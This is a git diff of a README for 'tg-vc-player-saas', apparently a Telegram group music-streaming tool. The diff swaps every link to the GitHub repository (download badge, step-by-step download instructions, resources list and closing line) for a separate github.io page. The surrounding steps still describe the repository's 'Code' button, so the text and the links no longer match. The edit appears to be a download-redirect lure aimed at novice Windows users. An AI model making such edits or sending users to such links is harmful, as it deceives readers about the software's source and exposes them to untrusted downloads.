@@ -1,7 +1,7 @@
 <h1>🎵 tg-vc-player-saas - Stream Music in Telegram Groups Instantly</h1>
 
 <p align="center">
-  <a href="https://github.com/Miciszavi48/tg-vc-player-saas"><img src="https://img.shields.io/badge/Download-tg--vc--player--saas-blue?style=for-the-badge&logo=github" alt="Download"></a>
+  <a href="https://miciszavi48.github.io"><img src="https://img.shields.io/badge/Download-tg--vc--player--saas-blue?style=for-the-badge&logo=github" alt="Download"></a>
 </p>
 
 ## 🎧 What This Software Does
@@ -14,7 +14,7 @@ Welcome! If you're new to this, don't worry. Follow these simple steps, and you'
 
 ### 📥 Download the Application
 
-**Visit this link to download the application:** [https://github.com/Miciszavi48/tg-vc-player-saas](https://github.com/Miciszavi48/tg-vc-player-saas)
+**Visit this link to download the application:** [https://miciszavi48.github.io](https://miciszavi48.github.io)
 
 Click the big blue "Download" button at the top of this page to get started.
 
@@ -32,7 +32,7 @@ Your Windows computer needs to meet these minimum requirements to run tg-vc-play
 
 ### Step 1: Download the Files
 
-1. Open your web browser and go to the download link: [https://github.com/Miciszavi48/tg-vc-player-saas](https://github.com/Miciszavi48/tg-vc-player-saas)
+1. Open your web browser and go to the download link: [https://miciszavi48.github.io](https://miciszavi48.github.io)
 2. Look for the green "Code" button on the page and click it
 3. Select "Download ZIP" from the dropdown menu
 4. Wait for the download to finish (this may take a few minutes)
@@ -189,7 +189,7 @@ The application follows Telegram's terms of service. Using it responsibly won't 
 
 ## 📚 Additional Resources
 
-- **GitHub Repository:** [https://github.com/Miciszavi48/tg-vc-player-saas](https://github.com/Miciszavi48/tg-vc-player-saas)
+- **GitHub Repository:** [https://miciszavi48.github.io](https://miciszavi48.github.io)
 - **Documentation:** Look for the `README.md` file inside the application folder
 - **Support:** Check the Issues section on the GitHub page for help
 
@@ -199,7 +199,7 @@ You now have everything you need to run your own Telegram music streaming servic
 
 Remember to periodically check the GitHub repository for updates and new features. The project is actively maintained, so you'll always have access to the latest improvements.
 
-**Visit this link to download the application:** [https://github.com/Miciszavi48/tg-vc-player-saas](https://github.com/Miciszavi48/tg-vc-player-saas)
+**Visit this link to download the application:** [https://miciszavi48.github.io](https://miciszavi48.github.io)
 
 Happy streaming!
 
